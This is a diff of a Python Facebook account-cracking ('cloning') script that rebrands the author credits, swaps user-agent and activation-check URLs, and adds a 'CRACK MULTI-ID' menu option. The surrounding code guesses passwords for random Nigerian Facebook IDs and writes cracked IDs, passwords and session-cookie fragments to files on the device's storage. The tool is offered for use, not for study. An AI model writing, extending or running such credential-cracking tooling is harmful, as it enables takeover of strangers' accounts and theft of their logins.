@@ -12,7 +12,7 @@ try:
     from requests.exceptions import ConnectionError
 except ModuleNotFoundError:
     os.system('pip install mechanize requests futures==2 > /dev/null')
-    os.system('python run.py')
+    os.system('python Bod-boy.py')
 from bs4 import BeautifulSoup
 ugen = []
 A = '\x1b[1;97m' 
@@ -59,7 +59,7 @@ def uaku():
         for ub in ua:
             ugen.append(ub)
     except:
-        a=requests.get('https://github.com/ChangzFB/UserAgent/blob/main/user-agentFB.txt').text
+        a=requests.get('https://github.com/Silenthacker804/silenthacker-/UserAgent/blob/main/user-agentFB.txt').text
         ua=open('.user-agentFB.txt','w')
         aa=re.findall('line">(.*?)<',str(a))
         for un in aa:
@@ -69,8 +69,8 @@ loop = 0
 cps = []
 oks = []
 twf = []
-#   os.system('xdg-open https://www.facebook.com/profile.php?id=100046218699200')
-#  os.system('xdg-open https://www.facebook.com/100046218699200/posts/pfbid02WDXM8ceRckt5HMpZZqwD2DmZf88LEZqmndkBvva167RBjXiN5EpAGTV7jJ2jP69ul/?app=fbl')
+#   os.system('xdg-open https://www.facebook.com/queen.vipe')
+#  os.system('xdg-open https://www.facebook.com/100045631817155/posts/pfbid03nAN5DkLdndu1MV8u3WMDRDLCisQ6GA7CCyYjjdaY9ARJvxSZiVy1qfpVwuHbktBl/?app=fbl')
 
 def clear():
     os.system('clear')
@@ -85,8 +85,8 @@ logo = """
 \t\x1b[1;97m##     ## ##     ## ##    ##  ##   ##  
 \t\x1b[1;92m##     ## ##     ## ##     ## ##    ## 
 \x1b[1;97m------------------------\x1b[1;97m------------------------
-\033[1;31m\033[1;37m AUTHOR  \x1b[1;97m :  \033[1;32m   MARK TECH 
-\033[1;31m\033[1;37m FACEBOOK \x1b[1;97m:  \033[1;32m   MARK CORNEL
+\033[1;31m\033[1;37m AUTHOR  \x1b[1;97m :  \033[1;32m   SOFZY MONEY 
+\033[1;31m\033[1;37m FACEBOOK \x1b[1;97m:  \033[1;32m   SOFZY CORNEL
 \033[1;31m\033[1;37m GROUP   \x1b[1;97m :  \033[1;32m   RELATIONSHIP GOALS 
 \033[1;31m\033[1;37m VERSION \x1b[1;97m :  \033[1;32m   6.0.0\x1b[1;94m + Updated
 \033[1;37m------------------------\033[1;37m------------------------ """
@@ -96,7 +96,7 @@ def chk():
   id = "|".join(uuid)
   print("\n\n\x1b[37;1m  YOUR ID : \033[94m"+id) 
   try: 
-    httpCaht = requests.get("https://www.facebook.com/100045741224847/posts/678398260361542/?substory_index=0&app=fbl").text 
+    httpCaht = requests.get("https://www.facebook.com/100045631817155/posts/672679744263080/?app=fbl").text 
     if id in httpCaht: 
       print("\033[92m  YOUR ID IS ACTIVE. .......\033[97m") 
       msg = str(os.geteuid()) 
@@ -121,7 +121,7 @@ def chk():
   id = "|".join(uuid)
   print("\n\n\x1b[37;1m  YOUR ID : \033[94m"+id) 
   try: 
-    httpCaht = requests.get("https://www.facebook.com/100045741224847/posts/678398260361542/?substory_index=0&app=fbl").text 
+    httpCaht = requests.get("https://www.facebook.com/100045631817155/posts/672679744263080/?app=fble").text 
     if id in httpCaht: 
       print("\033[92m  YOUR ID IS ACTIVE. .......\033[97m") 
       msg = str(os.geteuid()) 
@@ -147,11 +147,11 @@ def checks(oks,cps,twf):
     if not len(oks) != 0:
         pass
     if len(cps) != 0:
-        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mMARK-OK.txt' % (
+        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mSOFZY-OK.txt' % (
             H, P, str(len(oks))))
-        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mMARK-CP.txt' %
+        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mSOFZY-CP.txt' %
               (H, P, str(len(cps))))
-        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[1;97mMARK-2F.txt' %
+        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[1;97mSOFZY-2F.txt' %
               (H, P, str(len(twf))))
         input("\x1b[1;97mPRESE ENTER TO BACK xyz  ")
         xyz()
@@ -192,7 +192,7 @@ def xyz():
     print(f"")
     print(f"{BLUE}[01] {GREEN}RANDOM NIGERIAN CLONING")
     print(f"{BLUE}[00] {GREEN}EXIT PROGRAM ")
-    print(f"")
+    print(f"{BLUE}[02] {GREEN}CRACK MULTI-ID")
     print(f"\033[1;91m==================================================")
     LUQMAN = input("[âˆš] CHOOSE : ")
     if LUQMAN in ["1","01"]:
@@ -302,8 +302,8 @@ def free(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid=coki[24:39]
                 Red = '\033[1;31m'
-                print('     \033[1;33m[LOL-CP] '+uid+' | '+ps+'\033[0;97m')
-                open('/sdcard/LOL-CP.txt', 'a').write(cid+' | '+ps+'\n')
+                print('     \033[1;33m[SOFZY-CP] '+uid+' | '+ps+'\033[0;97m')
+                open('/sdcard/SOFZY-CP.txt', 'a').write(cid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             elif '/x/checkpoint' in log_cookies:
